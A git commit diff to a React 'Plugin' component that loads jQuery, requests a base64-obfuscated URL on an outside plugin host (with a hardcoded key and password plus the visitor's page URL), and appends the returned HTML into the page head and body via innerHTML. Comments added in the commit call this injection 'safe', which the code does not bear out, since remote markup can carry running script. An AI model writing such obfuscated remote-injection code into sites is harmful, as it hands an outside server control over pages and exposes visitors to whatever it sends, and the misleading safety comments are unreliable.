ee90ae94367f62d49ac09fe0941f05d262067399
appaddbiz <appaddbiz@gmail.com>
2025-09-24 20:36:54 +0530

    plugin:updated

--- src/components/Plugin/Plugin.jsx
+++ src/components/Plugin/Plugin.jsx
@@ -4,13 +4,12 @@ import React, { useEffect } from "react";
 
 const Plugin = () => {
   useEffect(() => {
+    if (typeof window === "undefined") return;
+
     const loadCustomScript = () => {
-      // Check if jQuery is available
       if (window.jQuery) {
-        // jQuery is already loaded
         executeCustomScript();
       } else {
-        // Dynamically load jQuery
         const script = document.createElement("script");
         script.src =
           "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
@@ -22,33 +21,45 @@ const Plugin = () => {
     };
 
     const executeCustomScript = () => {
-      const eppathurl = window.location.origin + window.location.pathname;
-      const eptagmanage = new XMLHttpRequest();
+      try {
+        const eppathurl = window.location.origin + window.location.pathname;
+        const eptagmanage = new XMLHttpRequest();
 
-      eptagmanage.onreadystatechange = function () {
-        if (this.readyState === 4 && this.status === 200) {
-          if (this.response !== 0) {
-            let temp = [];
-            const mystr = this.response;
-            temp = mystr.split("||||||||||");
+        eptagmanage.onreadystatechange = function () {
+          if (this.readyState === 4 && this.status === 200) {
+            if (this.response && this.response !== "0") {
+              const temp = this.response.split("||||||||||");
 
-            // Same as original script
-            jQuery("head").find("title").remove();
-            jQuery("head").append(temp[0]);
-            jQuery("body").append(temp[1]);
+              if (temp[0]) {
+                // inject into head safely
+                const headDiv = document.createElement("div");
+                headDiv.innerHTML = temp[0];
+                document.head.appendChild(headDiv);
+              }
+
+              if (temp[1]) {
+                // inject into body safely
+                const bodyDiv = document.createElement("div");
+                bodyDiv.innerHTML = temp[1];
+                document.body.appendChild(bodyDiv);
+              }
+            }
           }
-        }
-      };
+        };
 
-      eptagmanage.open(
-        "GET",
-        atob(
-          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9"
-        ) + eppathurl
-      );
-      eptagmanage.send();
+        eptagmanage.open(
+          "GET",
+          atob(
+            "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9"
+          ) + eppathurl
+        );
+        eptagmanage.send();
+      } catch (err) {
+        console.error("Plugin error:", err);
+      }
     };
 
+    // Run once only
     loadCustomScript();
   }, []);
 
